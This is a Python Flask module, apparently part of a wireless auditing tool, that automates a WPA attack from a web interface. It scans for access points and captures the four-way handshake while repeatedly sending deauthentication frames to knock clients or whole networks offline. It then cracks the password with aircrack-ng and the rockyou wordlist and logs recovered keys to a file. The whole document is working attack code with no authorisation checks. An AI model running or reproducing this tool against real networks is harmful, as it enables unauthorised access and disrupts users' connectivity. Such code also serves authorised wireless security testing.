import glob
import re
import os
import csv
import time
import threading
import subprocess
from datetime import datetime, timedelta
from flask import Blueprint, redirect, render_template, request, jsonify, url_for

from config import get_config
from logger import get_logger

CONFIG_INSTANCE = get_config()
CONFIG = CONFIG_INSTANCE.CONFIG
LOGGER = get_logger(*CONFIG_INSTANCE.get_logger_settings())

cracking_bp = Blueprint('cracking', __name__, url_prefix='/cracking')

# Global variables to hold status and thread
crack_status = {"log": "", "running": False, "result": None, "scanning": False}
crack_stop_event = threading.Event()
crack_thread = None

# Helper function to append to status log.


def update_status(msg):
    timestamp = datetime.now().strftime("[%H:%M:%S] ")
    crack_status["log"] += f"{timestamp}{msg}\n"
    LOGGER.info(msg)

# Function to set interface in monitor mode.


def set_monitor_mode(interface):
    update_status(f"Enabling monitor mode on {interface}...")
    try:
        proc = subprocess.Popen(["airmon-ng", "start", interface],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                universal_newlines=True)
        stdout, _ = proc.communicate(timeout=10)
        monitor_interface = interface if interface.endswith(
            "mon") else interface + "mon"
        update_status(f"Monitor interface set as {monitor_interface}")
        return monitor_interface
    except Exception as e:
        update_status(f"Error setting monitor mode: {e}")
        return None


@cracking_bp.route('/')
def cracking():
    from audit_modules.audit import get_audit_details
    if get_audit_details()[0]:
        update_status("Cracking module is disabled during audit.")
        return redirect(url_for('home'))
    # check if file cracked_keys.txt exists, if not create it
    if not os.path.exists("/var/log/cracked_ap_keys.txt"):
        with open("/var/log/cracked_ap_keys.txt", "w") as f:
            f.write("")
    # check if file cracked_keys.txt is empty, if not read it and send it to the template
    with open("/var/log/cracked_ap_keys.txt", "r") as f:
        cracked_ap = f.readlines()
    return render_template('cracking.html', cracked_ap=cracked_ap)


@cracking_bp.route('/scan', methods=['GET'])
def scan():
    crack_status["log"] = ""
    crack_status["scanning"] = True
    crack_status["result"] = None
    interface = CONFIG['interface']['cracking']
    monitor_interface = set_monitor_mode(interface)
    if monitor_interface is None:
        return jsonify({"error": "Could not enable monitor mode"}), 500

    scan_file = "/tmp/scan-01.csv"
    if os.path.exists(scan_file):
        os.remove(scan_file)
    update_status("Scanning for access points (10 seconds)...")
    proc = subprocess.Popen(
        ["airodump-ng", "-w", "/tmp/scan",
            "--output-format", "csv", monitor_interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(10)  # wait for scan to complete
    update_status("Scan complete. Select an AP to crack.")
    proc.terminate()
    time.sleep(1)  # allow file to be written

    aps = []
    if os.path.exists(scan_file):
        try:
            with open(scan_file, "r") as csvfile:
                reader = csv.reader(csvfile)
                for row in reader:
                    if len(row) < 1:
                        continue
                    if row[0].strip().startswith("BSSID"):
                        continue
                    if row[0].strip() == "":
                        break
                    if len(row) >= 11:
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        essid = row[-2].strip()
                        aps.append(
                            {"ssid": essid, "bssid": bssid, "channel": channel})

        except Exception as e:
            update_status(f"Error parsing scan file: {e}")
    else:
        update_status("No scan file generated.")
    update_status(f"Found {len(aps)} access points.")
    aps = sorted(aps, key=lambda x: x["ssid"])
    crack_status["scanning"] = False
    return jsonify(aps)


@cracking_bp.route('/start', methods=['POST'])
def start():
    global crack_thread, crack_status, crack_stop_event
    if crack_status["running"]:
        return jsonify({"error": "Cracking already in progress"}), 400

    data = request.get_json()
    target_ssid = data.get("ssid")
    target_bssid = data.get("bssid")
    target_channel = data.get("channel")
    method = data.get("method")

    if not (target_ssid and target_bssid and target_channel and method):
        return jsonify({"error": "Missing parameters"}), 400

    crack_status["running"] = True
    crack_status["result"] = None
    crack_stop_event.clear()

    crack_thread = threading.Thread(target=run_cracking, args=(
        target_ssid, target_bssid, target_channel, method))
    crack_thread.start()

    return jsonify({"status": "Cracking started"})


@cracking_bp.route('/stop', methods=['POST'])
def stop():
    global crack_stop_event
    crack_stop_event.set()
    crack_status["log"] = ""
    update_status("Stop signal received. Terminating cracking process.")
    return jsonify({"status": "Cracking stop initiated"})


@cracking_bp.route('/status', methods=['GET'])
def status():
    return jsonify(crack_status)

def get_crack_status():
    return crack_status


def get_latest_targetcap(prefix, suffix):
    # Create a regex pattern that matches files like /tmp/targetcap-<number>.csv or .cap exactly.
    regex = re.compile(rf"^{re.escape(prefix)}-\d+\.{suffix}$")
    # First, list all files matching the glob pattern, then filter using the regex.
    files = [f for f in glob.glob(f"{prefix}-*.{suffix}") if regex.match(f)]
    if files:
        return max(files, key=os.path.getmtime)
    return None


def run_cracking(target_ssid, target_bssid, target_channel, method):
    global crack_status, crack_stop_event
    start_time = datetime.now()
    update_status(
        f"Starting cracking process for {target_ssid} ({target_bssid}) on channel {target_channel}")
    interface = CONFIG['interface']['cracking']
    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface:
        update_status("Failed to set monitor mode. Aborting.")
        crack_status["running"] = False
        return

    cap_file_prefix = "/tmp/cracking/targetcap"
    if not os.path.exists("/tmp/cracking"):
        os.makedirs("/tmp/cracking")
    update_status("Starting airodump-ng to capture handshake...")
    airodump_cmd = ["airodump-ng", "-c", target_channel, "--bssid",
                    target_bssid, "-w", cap_file_prefix, monitor_interface]

    airodump_proc = subprocess.Popen(
        airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
    handshake_captured = False

    def deauth_loop():
        nonlocal handshake_captured, cap_file_prefix
        csv_file = get_latest_targetcap(cap_file_prefix, "csv")
        LOGGER.debug(f"CSV file: {csv_file}")
        time.sleep(2)
        while not crack_stop_event.is_set() and not handshake_captured:
            if csv_file is None or not os.path.exists(csv_file):
                return
            clients = []
            try:
                with open(csv_file, "r") as f:
                    reader = csv.reader(f)
                    in_client_section = False
                    for row in reader:
                        # check if we are in the client section by looking for the header Station MAC
                        if "Station MAC" in row:
                            in_client_section = True
                        if in_client_section and len(row) >= 1:
                            # first column (mac address)
                            client_mac = row[0].strip()
                            if len(client_mac) == 17 and ":" in client_mac:
                                clients.append(client_mac)

                for client in clients:
                    update_status(
                        f"Issuing deauth attack to client {client}...")
                    client_cmd = ["aireplay-ng", "-0", "2", "-a",
                                  target_bssid, "-c", client, monitor_interface]
                    try:
                        subprocess.run(
                            client_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
                    except Exception as e:
                        update_status(
                            f"Deauth error for client {client}: {e}")
            except Exception as e:
                update_status(f"Error parsing CSV for clients: {e}")
            if len(clients) == 0:
                # Issue broadcast deauth attack if no clients found
                update_status("Issuing broadcast deauth attack...")
                broadcast_cmd = ["aireplay-ng", "-0", "2",
                                 "-a", target_bssid, monitor_interface]
                try:
                    subprocess.run(broadcast_cmd, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, timeout=10)
                except Exception as e:
                    update_status(f"Broadcast deauth error: {e}")

            # Check for handshake capture every
            for _ in range(20):
                if handshake_captured:
                    break
                time.sleep(1)
    time.sleep(5)  # wait for airodump-ng to start
    deauth_thread = threading.Thread(target=deauth_loop)
    deauth_thread.start()

    update_status("Waiting for 4-way handshake (max 1 hour)...")
    while (datetime.now() - start_time) < timedelta(hours=1) and not crack_stop_event.is_set():
        LOGGER.debug("Checking for handshake...")
        try:
            if airodump_proc.poll() is not None:
                update_status("airodump-ng process terminated unexpectedly.")
                break
            stdout = ""
            # I don't know how&why, but this works
            # Using debug the first line is not updated but doing this way it works
            for i in range(10):
                stdout += airodump_proc.stdout.readline()  # type: ignore
            if "wpa handshake:" in stdout.lower():  # type: ignore
                handshake_captured = True
                update_status("Handshake captured!")
                break
            time.sleep(1)
        except Exception as e:
            update_status(f"Error reading airodump-ng output: {e}")
            break
    else:
        LOGGER.debug("Timeout reached or stop event set.")
        if not handshake_captured:
            update_status("Timeout reached without capturing handshake.")
            crack_stop_event.set()

    try:
        airodump_proc.terminate()
        try:
            airodump_proc.wait(timeout=15)
        except subprocess.TimeoutExpired:
            update_status("airodump-ng did not terminate; killing process.")
            airodump_proc.kill()
    except Exception as e:
        update_status(f"Error terminating airodump-ng: {e}")

    deauth_thread.join(timeout=5)

    if crack_stop_event.is_set() or not handshake_captured:
        update_status("Cracking process aborted.")
        crack_status["running"] = False
        return

    cap_file = get_latest_targetcap(cap_file_prefix, "cap")
    LOGGER.debug(f"Capture file: {cap_file}")
    update_status("Proceeding to password cracking stage...")
    if method == "aircrack":
        update_status(
            "Starting aircrack-ng cracking...")
        aircrack_cmd = ["aircrack-ng", "-a2", "-b", target_bssid,
                        "-w", "/usr/share/wordlists/rockyou.txt", cap_file]
        try:
            result = subprocess.run(
                aircrack_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            if result.returncode == 0:
                update_status("Cracking successful!")
                # fint key 
                key_match = re.search(r"KEY FOUND! \[(.*?)\]", result.stdout)
                if key_match:
                    key = key_match.group(1)
                    update_status(f"Key: {key}")
                    crack_status["result"] = key
                    # create txt file with the key and ssid nad macaddress
                    with open("/var/log/cracked_ap_keys.txt", "a") as f:
                        f.write(f"{target_ssid} ({target_bssid}): {key}\n")
                else:
                    update_status("Key not found in output.")
            else:
                update_status("Cracking failed.")
            
        except Exception as e:
            update_status(f"aircrack-ng failed: {e}")
    else:
        update_status("Unknown cracking method selected.")

    crack_status["running"] = False
    update_status("Cracking process completed.")
